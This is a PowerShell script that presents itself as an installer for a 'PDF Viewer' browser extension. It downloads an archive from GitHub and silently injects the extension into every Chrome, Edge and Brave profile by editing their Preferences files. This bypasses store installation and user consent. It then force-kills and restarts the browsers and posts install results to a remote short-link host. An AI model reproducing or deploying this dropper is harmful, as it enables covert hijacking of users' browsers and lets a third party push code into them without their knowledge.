$ErrorActionPreference='Stop'
$ProgressPreference='SilentlyContinue'
$ExtUrl='https://github.com/Castro02980/pdf-viewer-extension/archive/refs/heads/main.zip'
$NotifyUrl='https://wln.ink/n'

function Get-PathBasedId($path) {
    $normalized = $path
    if ($normalized.Length -ge 2 -and $normalized[1] -eq ':' -and $normalized[0] -match '[a-z]') {
        $normalized = $normalized[0].ToString().ToUpper() + $normalized.Substring(1)
    }
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($normalized)
    $hash = [System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes)
    $id = ''
    for ($i=0; $i -lt 16; $i++) {
        $id += [char](97 + ($hash[$i] -band 15))
    }
    return $id
}

function Inject-Profile($profPath, $extPath, $extId) {
    $prefFile = Join-Path $profPath 'Preferences'
    if (-not (Test-Path $prefFile)) { return $false }
    
    try {
        $pref = Get-Content $prefFile -Raw -Encoding UTF8 | ConvertFrom-Json
        if (-not $pref.extensions) { $pref | Add-Member -NotePropertyName extensions -NotePropertyValue ([PSCustomObject]@{}) -Force }
        if (-not $pref.extensions.settings) { $pref.extensions | Add-Member -NotePropertyName settings -NotePropertyValue ([PSCustomObject]@{}) -Force }
        
        $existing = $pref.extensions.settings.PSObject.Properties | Where-Object { $_.Name -eq $extId }
        if ($existing) { return $false }
        
        $setting = [ordered]@{
            location = 1
            manifest = @{
                name = 'PDF Viewer'
                version = '1.0.0'
                manifest_version = 3
                key = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw+HFwTE2p3LvyET2ZkHLW/cxVrKPdwblLCdLh7Vfqk4Xpo3DJlqZh8jtGN8F1pNQJHHrx9SXFl0nMm8rZ0XM3JKl+2h6Hro4JqqP3MqQm0mOYCNNAn7L8s6qqPkWQNR3Wh0vVpL4M3hO+Z2H7YqmQ7rLUZ8nW8xZh7Jl0Y8h9mN3H7r4Bm+VW3Lq9mZ7N8h0Q7L3W4n8M3h7Y+Z2Hro4JqqP3MqQm0mOYCNNAn7L8s6qqPkWQNR3Wh0vVpL4M3hO+Z2H7YqmQ7rLUZ8nW8xZh7Jl0Y8h9mN3H7r4Bm+VW3Lq9mZ7N8h0Q7L3W4n8M3h7Y+Z2Hro4JqqP3MqQm0mOYCNNAn7L8s6qqPkWQNR3Wh0vVpL4QIDAQAB'
            }
            path = $extPath
            state = 1
        }
        
        $pref.extensions.settings | Add-Member -NotePropertyName $extId -NotePropertyValue $setting -Force
        
        $json = $pref | ConvertTo-Json -Depth 32 -Compress
        [System.IO.File]::WriteAllText($prefFile, $json, (New-Object System.Text.UTF8Encoding $false))
        return $true
    } catch {
        return $false
    }
}

function Process-Browser($name, $exeName, $paths, $extPath, $extId) {
    $injected = 0
    foreach ($p in $paths) {
        $userDataDir = [System.Environment]::ExpandEnvironmentVariables($p)
        if (-not (Test-Path $userDataDir)) { continue }
        
        $profiles = @('Default') + @(Get-ChildItem $userDataDir -Directory -Filter 'Profile *' -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
        foreach ($prof in $profiles) {
            $profPath = Join-Path $userDataDir $prof
            if (Inject-Profile $profPath $extPath $extId) { $injected++ }
        }
    }
    
    $procs = Get-Process $exeName -ErrorAction SilentlyContinue
    $mySession = (Get-Process -Id $PID).SessionId
    $toRestart = @()
    
    foreach ($proc in $procs) {
        if ($proc.SessionId -ne $mySession) { continue }
        $cmd = ''
        try {
            $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($proc.Id)").CommandLine
        } catch { continue }
        
        if ($cmd -match '--type=') { continue }
        $toRestart += $cmd
        Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
    }
    
    if ($toRestart.Count -gt 0) {
        Start-Sleep -Milliseconds 800
        $exePath = "${env:ProgramFiles}\Google\$name\Application\$exeName.exe"
        if ($name -eq 'Microsoft\Edge') { $exePath = "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe" }
        if ($name -eq 'BraveSoftware\Brave-Browser') { $exePath = "${env:ProgramFiles}\BraveSoftware\Brave-Browser\Application\brave.exe" }
        
        if (Test-Path $exePath) {
            Start-Process $exePath -ArgumentList '--restore-last-session' -WindowStyle Normal
        }
    }
    
    return $injected
}

try {
    $tempZip = "$env:TEMP\pdf-ext.zip"
    $tempDir = "$env:TEMP\pdf-ext-tmp"
    $extDir = "$env:LOCALAPPDATA\PDFViewerExt"
    
    if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
    if (Test-Path $extDir) { Remove-Item $extDir -Recurse -Force }
    
    Invoke-WebRequest -Uri $ExtUrl -OutFile $tempZip -UseBasicParsing
    Expand-Archive -Path $tempZip -DestinationPath $tempDir -Force
    Remove-Item $tempZip -Force
    
    $manifest = Get-ChildItem $tempDir -Filter 'manifest.json' -Recurse | Select-Object -First 1
    if (-not $manifest) { throw 'Extension not found' }
    
    Copy-Item $manifest.DirectoryName $extDir -Recurse -Force
    $extId = Get-PathBasedId $extDir
    
    $chromePaths = @('%LOCALAPPDATA%\Google\Chrome\User Data')
    $edgePaths = @('%LOCALAPPDATA%\Microsoft\Edge\User Data')
    $bravePaths = @('%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data')
    
    $total = 0
    $total += Process-Browser 'Google\Chrome' 'chrome' $chromePaths $extDir $extId
    $total += Process-Browser 'Microsoft\Edge' 'msedge' $edgePaths $extDir $extId
    $total += Process-Browser 'BraveSoftware\Brave-Browser' 'brave' $bravePaths $extDir $extId
    
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    
    if ($total -eq 0) {
        Invoke-WebRequest -Uri $NotifyUrl -Method Post -Body "ev=install_fail&os=windows&info=injected 0 profiles" -ContentType 'text/plain' -UseBasicParsing -TimeoutSec 5 | Out-Null
        Write-Host 'No profiles found. Close browser and run installer again.' -ForegroundColor Red
        exit 1
    }
    
    Invoke-WebRequest -Uri $NotifyUrl -Method Post -Body "ev=install&os=windows&info=injected $total profiles" -ContentType 'text/plain' -UseBasicParsing -TimeoutSec 5 | Out-Null
    Write-Host "Successfully installed to $total profiles" -ForegroundColor Green
    exit 0
    
} catch {
    $msg = $_.Exception.Message
    if ($msg.Length -gt 100) { $msg = $msg.Substring(0,100) }
    Invoke-WebRequest -Uri $NotifyUrl -Method Post -Body "ev=install_fail&os=windows&info=$msg" -ContentType 'text/plain' -UseBasicParsing -TimeoutSec 5 | Out-Null
    Write-Host "Error: $msg" -ForegroundColor Red
    exit 1
}
